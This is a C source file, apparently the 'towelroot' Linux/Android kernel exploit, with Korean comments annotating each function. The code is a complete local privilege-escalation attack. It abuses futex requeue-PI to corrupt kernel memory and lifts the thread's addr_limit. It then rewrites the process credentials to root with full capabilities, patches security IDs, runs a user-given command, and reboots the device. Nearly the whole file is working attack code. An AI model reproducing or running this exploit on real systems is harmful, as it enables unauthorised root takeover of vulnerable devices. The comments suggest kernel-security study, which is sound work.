/*

towelroot.c

- futex: https://man7.org/linux/man-pages/man7/futex.7.html
	futex는 유저 스페이스의 페이지를 락 잠금하는 기능을 가진 뮤텍스를 의미함.
	lock하고 wake할 수 있음.

[열거 함수]
read_pipe() // copy_from_kernel()
write_pipe() // copy_to_user()

[signal handler] write_kernel() 커널 메모리에 크리덴셜들 갱신하도록 직접 접근해서 쓰는 함수.

wake_actionthread() // make_acton에 의해서 생성된 SIG_KILL 시스템 콜 핸들러 pthread 쓰레드를 많이 생성하는 함수.
make_socket() // accept_socket() 함수를 대기시키고, 그곳에 접속하는 함수.
[th] make_action()
[th] send_magicmsg() // MAGIC, MAGIC_ALT 메시지 전송 함수.
setup_exploit() // 익스플로잇 메모리 값 설정.
[th] signal_exploit() // 시그날 익스플로잇 함수.
accept_socket() // TCP 소켓 하나 대기하고 억셉트 받는 함수.
init_exploit() // 익스플로잇 실행.


*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>

/*
	call path:
		main()
			init_exploit():
				[th1]: accept_socket(): TCP 서버 소켓 하나 대기 시켜서 접속 받고 리턴함.
				[th2]: signal_exploit(): 익스플로잇 설정 ...
					setup_exploit(): MAGIC_ALT, MAGIC 익스플로잇 매직 값 설정함.
					wake_actionthread 쓰레드를 많이 켬.
					make_action(): 시그날 락하는 함수.
						write_kernel() 함수로 커널 메모리에 접근해서 크리덴셜 등 갱신하고 setuid가 0일때
						익스플로잇 실행 인자로 전달된 path의 파일 (/bin/sh) 실행.
				[th3]: send_magicmsg(): 설정된(획득한) MAGIC, MAGIC_ALT 메시지(msg)를 전송.
				       make_socket(): 5551 TCP 포트로 대기 중이던 th1 쓰레드의 소켓에 접해서 MAGIC, MAGIC_ALT 메시지 전송.

					
*/

// [futex 기능 이 쓰이는 아래 3개 기능 요소:]
//#define FUTEX_LOCK_PI            6 // 락을 거는 기능.
//#define FUTEX_WAIT_REQUEUE_PI   11 // non-PI futex 락을 기다리는 기능.
//#define FUTEX_CMP_REQUEUE_PI    12 // waiter(대기 락)의 총 수를 리턴 하는 기능.

// ARRAY_SIZE 변수 크기 구하는 매크로  함수.
#define ARRAY_SIZE(a)       (sizeof (a) / sizeof (*(a)))

// 커널 주소 시작.
#define KERNEL_START        0xc0000000

// TCP 소켓 대기 번호.
#define LOCAL_PORT      5551

// 크리덴셜 갱신을 위한 구조.
struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
    struct task_struct  *task;      /* main task structure */
    struct exec_domain  *exec_domain;   /* execution domain */
    __u32           flags;      /* low level flags */
    __u32           status;     /* thread synchronous flags */
    __u32           cpu;        /* current CPU */
    int         preempt_count;  /* 0 => preemptable,
                           <0 => BUG */
    unsigned long  addr_limit;

    /* ... */
};

struct kernel_cap_struct {
    unsigned long cap[2];
};

struct cred {
    unsigned long usage;
    uid_t uid;
    gid_t gid;
    uid_t suid;
    gid_t sgid;
    uid_t euid;
    gid_t egid;
    uid_t fsuid;
    gid_t fsgid;
    unsigned long securebits;
    struct kernel_cap_struct cap_inheritable;
    struct kernel_cap_struct cap_permitted;
    struct kernel_cap_struct cap_effective;
    struct kernel_cap_struct cap_bset;
    unsigned char jit_keyring;
    void *thread_keyring;
    void *request_key_auth;
    void *tgcred;
    struct task_security_struct *security;

    /* ... */
};

struct list_head {
    struct list_head *next;
    struct list_head *prev;
};

struct task_security_struct {
    unsigned long osid;
    unsigned long sid;
    unsigned long exec_sid;
    unsigned long create_sid;
    unsigned long keycreate_sid;
    unsigned long sockcreate_sid;
};


struct task_struct_partial {
    struct list_head cpu_timers[3];
    struct cred *real_cred;
    struct cred *cred;
    //struct cred *replacement_session_keyring;
    char comm[16];
};


struct mmsghdr {
    struct msghdr msg_hdr;
    unsigned int  msg_len;
};

// 공격에 사용되는 변수 선언.
//bss
int uaddr1 = 0;
int uaddr2 = 0;
struct thread_info *HACKS_final_stack_base = NULL;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
volatile int do_socket_tid_read = 0;
volatile int did_socket_tid_read = 0;
volatile int do_splice_tid_read = 0;
volatile int did_splice_tid_read = 0;
volatile int do_dm_tid_read = 0;
volatile int did_dm_tid_read = 0;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int HACKS_fdm = 0;
unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
pthread_mutex_t *is_kernel_writing;
pid_t last_tid = 0;
int g_argc;
char rootcmd[256]; // 익스플로잇 실행 인자 저장할 변수.

// readbuf에서 count만큼 writebuf로 쓰기하는 함수.
// copy_from_kernel()
ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);

    len = write(pipefd[1], writebuf, count);

    if (len != count) {
        printf("FAILED READ @ %p : %d %d\n", writebuf, (int)len, errno);
        while (1) {
            sleep(10);
        }
    }

    read(pipefd[0], readbuf, count);

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}


// writebuf에서 readbuf로 count만큼 쓰기하는 함수.
// copy_to_kernel()
ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);

    write(pipefd[1], writebuf, count);
    len = read(pipefd[0], readbuf, count);

    if (len != count) {
        printf("FAILED WRITE @ %p : %d %d\n", readbuf, (int)len, errno);
        while (1) {
            sleep(10);
        }
    }

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}

// 시그날 핸들러로 SIG_KILL 될 때마다 호출될 핸들러:
// write_kernel (커널에 크리덴셜 모두를 쓰기해서 리부팅하고 정리해서 권한을 상승시키는 기능)
void write_kernel(int signum)
{
    struct thread_info stackbuf;
    unsigned long taskbuf[0x100];
    struct cred *cred;
    struct cred credbuf;
    struct task_security_struct *security;
    struct task_security_struct securitybuf;
    pid_t pid;
    int i;
    int ret;
    FILE *fp;

    pthread_mutex_lock(&is_thread_awake_lock);
    pthread_cond_signal(&is_thread_awake);
    pthread_mutex_unlock(&is_thread_awake_lock);

    if (HACKS_final_stack_base == NULL) {
        static unsigned long new_addr_limit = 0xffffffff;
        char *slavename;
        int pipefd[2];
        char readbuf[0x100];

        printf("cpid1 resumed\n");

        pthread_mutex_lock(is_kernel_writing);

        HACKS_fdm = open("/dev/ptmx", O_RDWR); // /dev/ptmx(가상 터미널 master/slave 생성)
        unlockpt(HACKS_fdm);
        slavename = (char *)ptsname(HACKS_fdm); // slavename = 슬레이브 네임 얻기.

        open(slavename, O_RDWR); // 슬레이브 오픈.

        do_splice_tid_read = 1;
        while (1) {
            if (did_splice_tid_read != 0) {
                break;
            }
        }

        read(HACKS_fdm, readbuf, sizeof readbuf); // ptmx 버퍼 읽음.

        printf("addr_limit: %p\n", &HACKS_final_stack_base->addr_limit);

		// new_addr_limit을 설정.
        write_pipe(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit);

        pthread_mutex_unlock(is_kernel_writing);

        while (1) {
            sleep(10);
        }
    }

    printf("cpid3 resumed.\n");

    pthread_mutex_lock(is_kernel_writing);

    printf("hack.\n");

	// HACKS_final_stack_base = stackbuf(스택 버퍼) 읽음.
	// stackbuf.task = taskbuf를 읽음.
    read_pipe(HACKS_final_stack_base, &stackbuf, sizeof stackbuf);
    read_pipe(stackbuf.task, taskbuf, sizeof taskbuf);

    cred = NULL;
    security = NULL;
    pid = 0;

    for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
        struct task_struct_partial *task = (void *)&taskbuf[i];


        if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
         && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
         && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
         && task->real_cred == task->cred) {
            cred = task->cred;
            break;
        }
    }

    read_pipe(cred, &credbuf, sizeof credbuf);

    // credbuf.security 읽음.
    security = credbuf.security;

    if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
        read_pipe(security, &securitybuf, sizeof securitybuf);

        if (securitybuf.osid != 0
         && securitybuf.sid != 0
         && securitybuf.exec_sid == 0
         && securitybuf.create_sid == 0
         && securitybuf.keycreate_sid == 0
         && securitybuf.sockcreate_sid == 0) {
            securitybuf.osid = 1;
            securitybuf.sid = 1;

            printf("task_security_struct: %p\n", security);

            write_pipe(security, &securitybuf, sizeof securitybuf); // 보안 버퍼 쓰기.
        }
    }

	// 크리덴셜 버퍼 설정.
    credbuf.uid = 0;
    credbuf.gid = 0;
    credbuf.suid = 0;
    credbuf.sgid = 0;
    credbuf.euid = 0;
    credbuf.egid = 0;
    credbuf.fsuid = 0;
    credbuf.fsgid = 0;

	// 크리덴셜 캡(권한) 설정.
    credbuf.cap_inheritable.cap[0] = 0xffffffff;
    credbuf.cap_inheritable.cap[1] = 0xffffffff;
    credbuf.cap_permitted.cap[0] = 0xffffffff;
    credbuf.cap_permitted.cap[1] = 0xffffffff;
    credbuf.cap_effective.cap[0] = 0xffffffff;
    credbuf.cap_effective.cap[1] = 0xffffffff;
    credbuf.cap_bset.cap[0] = 0xffffffff;
    credbuf.cap_bset.cap[1] = 0xffffffff;

	// 크리덴셜 버퍼 크리덴셜에 쓰기함.
    write_pipe(cred, &credbuf, sizeof credbuf);

	// gettid로 쓰레드 ID 즉 pid를 구함.
    pid = syscall(__NR_gettid);

    for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
        static unsigned long write_value = 1;

        if (taskbuf[i] == pid) {
			// taskbuf[i]가 pid와 같으면 write_pipe 함수로 write_value를 stackbuf.task(커널 스택 태스크)에 복사함.
            write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value);

            if (getuid() != 0) {
                printf("ROOT FAILED\n");
                while (1) { // 루트 실패시 무한 루프.
                    sleep(10);
                }
            } else {    //rooted // 루트 성공이면 코드 브레이크.
                break;
            }
        }
    }

    sleep(1);

    if (g_argc >= 2) {
        system(rootcmd); // /bin/bash로 인자를 넘겨야 함. 그러면 쉘 실행됨.
    }
    system("/system/bin/touch /dev/rooted"); // /dev/rooted 디바이스 생성.

    pid = fork();
    if (pid == 0) {
        while (1) {
            ret = access("/dev/rooted", F_OK); // /dev/rooted 접근이 되면.(생성되었으면).
            if (ret >= 0) {
                break;
            }
        }

        printf("wait 10 seconds...\n");
        sleep(10);

        printf("rebooting...\n");
        sleep(1);
        system("reboot"); // 리부팅.

        while (1) {
            sleep(10);
        }
    }

	// 뮤텍스 락 해제.
    pthread_mutex_lock(&done_lock);
    pthread_cond_signal(&done);
    pthread_mutex_unlock(&done_lock);

    while (1) {
        sleep(10);
    }

    return;
}

// 시그날 action을 설정하는 쓰레드 함수.
void *make_action(void *arg) {
    int prio;
    struct sigaction act;
    int ret;

    prio = (int)arg;
    last_tid = syscall(__NR_gettid); // last_tid = gettid 시스템 콜.

    pthread_mutex_lock(&is_thread_desched_lock);
    pthread_cond_signal(&is_thread_desched);

    // write_kernel 시그날 핸들러 함수(커널 코드를 쓰는 해커 함수)를 설정.
    act.sa_handler = write_kernel;
    sigemptyset(&act.sa_mask);
    act.sa_flags = 0;
    act.sa_restorer = NULL;
    sigaction(12, &act, NULL);

	// 프로세스 우선순위 설정.
    setpriority(PRIO_PROCESS, 0, prio);

    pthread_mutex_unlock(&is_thread_desched_lock);

    do_dm_tid_read = 1;

    while (did_dm_tid_read == 0) {
        ;
    }

	// futex 락 걺.
	ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    printf("futex dm: %d\n", ret);

	// 무한 루프 대기.
    while (1) {
        sleep(10);
    }

    return NULL;
}

// action 쓰레드를 대기하는 함수.
// 쓰레드 액션을 만드는 함수.
pid_t wake_actionthread(int prio) {
    pthread_t th4;
    pid_t pid;
    char filename[256];
    FILE *fp;
    char filebuf[0x1000];
    char *pdest;
    int vcscnt, vcscnt2;

    do_dm_tid_read = 0;
    did_dm_tid_read = 0;


    pthread_mutex_lock(&is_thread_desched_lock);

    pthread_create(&th4, 0, make_action, (void *)prio); // make_action 쓰레드 생성.
    
	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

    pid = last_tid; pid = 마지막 tid(last_tid)

	// filename = 태스크 상태 파일명 설정.
    sprintf(filename, "/proc/self/task/%d/status", pid);

	// 태스크 상태 오픈.
    fp = fopen(filename, "rb");

    if (fp == 0) {
        vcscnt = -1;
    }
    else {
        fread(filebuf, 1, sizeof filebuf, fp);
        pdest = strstr(filebuf, "voluntary_ctxt_switches");
        pdest += 0x19;
		// vcscnt = voluntary_ctx_switches+0x19 오프셋 값 읽음.
        vcscnt = atoi(pdest);
        fclose(fp);
    }

    //sync with the action thread to find a voluntary ctxt switch
	// voluntary ctxt switch를 액션 쓰레드가 찾는데 필요한 싱크.(동기화).
    while (do_dm_tid_read == 0) {
        usleep(10);
    }

	// tid_read가 실행되었다고 설정.
    did_dm_tid_read = 1;

    while (1) {
        sprintf(filename, "/proc/self/task/%d/status", pid); // 태스크 상태 오픈.
        fp = fopen(filename, "rb");

        if (fp == 0) {
            vcscnt2 = -1;
        }
        else { // 열리면 vcscnt2 읽음.
            fread(filebuf, 1, sizeof filebuf, fp);
            pdest = strstr(filebuf, "voluntary_ctxt_switches");
            pdest += 0x19;
            vcscnt2 = atoi(pdest);
            fclose(fp);
        }

        if (vcscnt2 == vcscnt + 1) { // vcscnt2 가 vcscnt+1과 같으면 코드 브레이크.
            break;
        }
        usleep(10);

    }

    pthread_mutex_unlock(&is_thread_desched_lock);

    return pid; // last_tid 즉 pid 변수 리턴.
}

//connect to :5551 and set the SNDBUF=1
// 5551 포트로 로컬 호스트 접속하고 SNDBUF=1 설정 함수.
int make_socket() {
    int sockfd;
    struct sockaddr_in addr = {0};
    int ret;
    int sock_buf_size;

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd < 0) {
        printf("socket failed.\n");
        usleep(10);
    } else {
        addr.sin_family = AF_INET;
        addr.sin_port = htons(LOCAL_PORT);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    }

    while (1) {
        ret = connect(sockfd, (struct sockaddr *)&addr, 16);
        if (ret >= 0) {
            break;
        }
        usleep(10);
    }

    sock_buf_size = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

    return sockfd;
}

// MAGIC 메시지를 소켓으로 전송하는 함수.
// 메시지 전송 함수. 메시지는 iovec 구조체로 선언된 구조체임.
void *send_magicmsg(void *arg) {
    int sockfd;
    struct mmsghdr msgvec[1];
    struct iovec msg_iov[8];
    unsigned long databuf[0x20];
    int i;
    int ret;

    waiter_thread_tid = syscall(__NR_gettid);
    setpriority(PRIO_PROCESS, 0, 12);//0 denotes the calling PID for PRIO_PROCESS

    sockfd = make_socket();

    for (i = 0; i < ARRAY_SIZE(databuf); i++) {
        databuf[i] = MAGIC;
    }

    for (i = 0; i < 8; i++) {
        msg_iov[i].iov_base = (void *)MAGIC;
        msg_iov[i].iov_len = 0x10;
    }

    msgvec[0].msg_hdr.msg_name = databuf;
    msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
    msgvec[0].msg_hdr.msg_iov = msg_iov;
    msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
    msgvec[0].msg_hdr.msg_control = databuf;
    msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
    msgvec[0].msg_hdr.msg_flags = 0;
    msgvec[0].msg_len = 0;

    //wait the search goodnum thread to wake me up
    syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);

    do_socket_tid_read = 1;

    while (1) {
        if (did_socket_tid_read != 0) {
            break;
        }
    }

    ret = 0;

    while (1) {
        ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
        if (ret <= 0) {
            break;
        }
    }

    if (ret < 0) {
        perror("SOCKSHIT");
    }
    printf("EXIT WTF\n");
    while (1) {
        sleep(10);
    }

    return NULL;
}

// setup_exploit:
// mem 변수에 익스플로잇 관련 값 설정.
// mem 인자로 받은 메모리 주소에 0x81, 0x85라는  값과 mem(메모리 주소) 위치의 오프셋 주소를
// 적절히 설정했다. 
static inline setup_exploit(unsigned long mem)
{
    *((unsigned long *)(mem - 0x04)) = 0x81; // mem offset - 0x4 = 0x81.
    *((unsigned long *)(mem + 0x00)) = mem + 0x20; // mem = mem+0x20 (주소 값).
    *((unsigned long *)(mem + 0x08)) = mem + 0x28; // mem+0x8 = mem+0x28 (주소 값).
    *((unsigned long *)(mem + 0x1c)) = 0x85; // mem+0x1c = 0x85
    *((unsigned long *)(mem + 0x24)) = mem; // mem+0x24 = mem.
    *((unsigned long *)(mem + 0x2c)) = mem + 8; // mem+0x2c = mem+8.
}

// signal_exploit:
void *signal_exploit(void *arg) {
    int ret;
    char filename[256];
    FILE *fp;
    char filebuf[0x1000];
    char *pdest;
    int vcscnt, vcscnt2;
    unsigned long magicval;
    pid_t pid;
    unsigned long goodval, goodval2;
    unsigned long addr, setaddr;
    int i;
    char buf[0x1000];

    // __NR_futex 시스템 콜 호출로 futex를 락 걺 (FUTEX_LOCK_PI)
    syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

    while (1) {
        //keep calling futex_requeue until the sendmagic thread called futex_wait_requeue_pi, 
        //then we have something to requeue.
        // __NR_futex 시스템 콜 호출로 큐를 리큐함 (FUTEX_CMP_REQUEUE_PI - 리큐).
        ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
        if (ret == 1) {
            break;
        }
        usleep(10);
    }

    // uaddr2의 rtmutex 상의 액션 스레드를 잠재움.
    wake_actionthread(6);//make sure the action thread is sleeping on rtmutex of uaddr2
    // 대기 2.
    wake_actionthread(7);//a waiter will be added to the plist(rbtree in 3.14 and higher) of rtmutex

    uaddr2 = 0;//key step
    do_socket_tid_read = 0;
    did_socket_tid_read = 0;

	// __NR_futex futex 리큐.
    //because the uaddr2 == 0, we will get this lock at once! q.rt_waiter will be NULL
    syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);

    // do_socket_tid_read가 0이 아니면 코드 브레이크. (쓰레드가 해당 변수를 0이 아닌 값으로 바꾸면 브레이크).
    while (1) {
        if (do_socket_tid_read != 0) {
            break;
        }
    }

    // 태스크 상태를 읽을 파일명 구성.
    sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);

    // 태스크 상태 파일 오픈.
    fp = fopen(filename, "rb");

    if (fp == 0) {
        vcscnt = -1;
    }
    else {
        fread(filebuf, 1, sizeof filebuf, fp);
        pdest = strstr(filebuf, "voluntary_ctxt_switches"); // voluntary_ctxt_switches(프로세스가 얼마나 많은 컨텍스트 스위칭을 하는가 숫자 갑)
        pdest += 0x19; // voluntary_ctxt_switches +0x19 = pdest 변수 임.
        vcscnt = atoi(pdest);
        fclose(fp);
    }

    // did_socket_tid_read = 1로 설정.
    did_socket_tid_read = 1;

    while (1) {
		// 태스크 상태 오픈.
        sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
        fp = fopen(filename, "rb");

        if (fp == 0) {
            vcscnt2 = -1;
        }
        else {
			// 파일을 읽어서 voluntary_ctxt_switches 문자열을 검색 + 0x19 = pdest.
            fread(filebuf, 1, sizeof filebuf, fp);
            pdest = strstr(filebuf, "voluntary_ctxt_switches");
            pdest += 0x19;
            vcscnt2 = atoi(pdest); // vcscnt2 = 정수형 변환된 pdest 저장.
            fclose(fp);
        }

        if (vcscnt2 == vcscnt + 1) { // vcscnt2 == vcscnt +1과 같으면 브레이크.
            break;
        }
        usleep(10);
    }

	// 여기에 있으면 sendmsg 시스템 콜이 제대로 실행되었다는  것을 의미합니다.
    //we get here means the sendmmsg syscall has been called successfully.
    printf("starting the dangerous things\n");

    // MAGIC_ALT, MAGIC 두 개의 MAGIC 값을 적절히 설정함.
    setup_exploit(MAGIC_ALT);
    setup_exploit(MAGIC);

    magicval = *((unsigned long *)MAGIC);

    wake_actionthread(11);

    if (*((unsigned long *)MAGIC) == magicval) {
        printf("using MAGIC_ALT.\n");
        MAGIC = MAGIC_ALT;
    }

    while (1) {
        is_kernel_writing = (pthread_mutex_t *)malloc(4);
        pthread_mutex_init(is_kernel_writing, NULL);

        setup_exploit(MAGIC);

        pid = wake_actionthread(11);

        goodval = *((unsigned long *)MAGIC) & 0xffffe000;

        printf("%p is a good number\n", (void *)goodval);

        do_splice_tid_read = 0;
        did_splice_tid_read = 0;

        pthread_mutex_lock(&is_thread_awake_lock);

        kill(pid, 12);

        pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
        pthread_mutex_unlock(&is_thread_awake_lock);

        while (1) {
            if (do_splice_tid_read != 0) {
                break;
            }
            usleep(10);
        }

        sprintf(filename, "/proc/self/task/%d/status", pid);
        fp = fopen(filename, "rb");
        if (fp == 0) {
            vcscnt = -1;
        }
        else {
            fread(filebuf, 1, sizeof filebuf, fp);
            pdest = strstr(filebuf, "voluntary_ctxt_switches");
            pdest += 0x19;
            vcscnt = atoi(pdest);
            fclose(fp);
        }

        did_splice_tid_read = 1;

        while (1) {
            sprintf(filename, "/proc/self/task/%d/status", pid);
            fp = fopen(filename, "rb");
            if (fp == 0) {
                vcscnt2 = -1;
            }
            else {
                fread(filebuf, 1, sizeof filebuf, fp);
                pdest = strstr(filebuf, "voluntary_ctxt_switches");
                pdest += 19;
                vcscnt2 = atoi(pdest);
                fclose(fp);
            }

            if (vcscnt2 != vcscnt + 1) {
                break;
            }
            usleep(10);
        }

        goodval2 = 0;

        setup_exploit(MAGIC);

        *((unsigned long *)(MAGIC + 0x24)) = goodval + 8;

        wake_actionthread(12);
        goodval2 = *((unsigned long *)(MAGIC + 0x24));

        printf("%p is also a good number.\n", (void *)goodval2);

        for (i = 0; i < 9; i++) {
            setup_exploit(MAGIC);

            pid = wake_actionthread(10);

            if (*((unsigned long *)MAGIC) < goodval2) {
                HACKS_final_stack_base = (struct thread_info *)(*((unsigned long *)MAGIC) & 0xffffe000);

                pthread_mutex_lock(&is_thread_awake_lock);

                kill(pid, 12);

                pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
                pthread_mutex_unlock(&is_thread_awake_lock);

                printf("GOING\n");

                write(HACKS_fdm, buf, sizeof buf);

                while (1) {
                    sleep(10);
                }
            }

        }
    }

    return NULL;
}

// accept_socket() 기능.
// TCP 서버 소켓 대기 후 accept() 성공하면 리턴하고, 아닐 시 무한 루프 도는 함수.
void *accept_socket(void *arg) {
    int sockfd;
    int yes;
    struct sockaddr_in addr = {0};
    int ret;

    // TCP 소켓 하나 할당.
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    yes = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOCAL_PORT); // LOCAL_PORT=5551
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)); // 바인드.

    listen(sockfd, 1); // 서버 소켓 하나 대기.

    while(1) {
        ret = accept(sockfd, NULL, NULL); // 접속 ㅂ ㅏㄷ음.
        if (ret < 0) {
            printf("**** SOCK_PROC failed ****\n");
            while(1) {
                sleep(10);
            }
        } else {
            printf("i have a client like hookers.\n"); // 소켓 성공시 리턴.
        }
    }

    return NULL;
}

// init_exploit: 익스플로잇 실행 기능.
/*
	call path:
		[th1]: accept_socket()
		[th2]: signal_exploit() 
		[th3]: send_magicmsg()
*/
void init_exploit() {
    unsigned long addr;
    pthread_t th1, th2, th3;

    printf("running with pid %d\n", getpid());

    // accept_socket() 함수를 th1(쓰레드 1)로 생성.
    pthread_create(&th1, NULL, accept_socket, NULL);

    // 0xa0000000에 0x110000길이의 익명 메모리를 페이지를 맵핑.
    addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800; // MAGIC = +0x800 오프셋.
    MAGIC = addr;

    if ((long)addr >= 0) {
        printf("first mmap failed?\n");
        while (1) {
            sleep(10);
        }
    }

    // addr = 0x100000에 0x110000 크기의 익명 메모리 페이지를 맵핑.
    addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800;
    MAGIC_ALT = addr; // MAGIC_ALT = addr+0x800

    if (addr > 0x110000) {
        printf("second mmap failed?\n");
        while (1) {
            sleep(10);
        }
    }

    // signal_exploit(), send_magicmsg() 두 함수를 쓰레드로 실행.
    pthread_mutex_lock(&done_lock);
    pthread_create(&th2, NULL, signal_exploit, NULL);
    pthread_create(&th3, NULL, send_magicmsg, NULL);
    pthread_cond_wait(&done, &done_lock);
}

int main(int argc, char **argv) {
    g_argc = argc;

    if (argc >= 2) {
        strncpy(rootcmd, argv[1], sizeof(rootcmd) - 1); // rootcmd에 익스플로잇 실행 인자 복사. 
    }

    init_exploit(); // init_exploit로 익스플로잇 실행.

    printf("Finished, looping.\n");

    while (1) {
        sleep(10);
    }

    return 0;
}
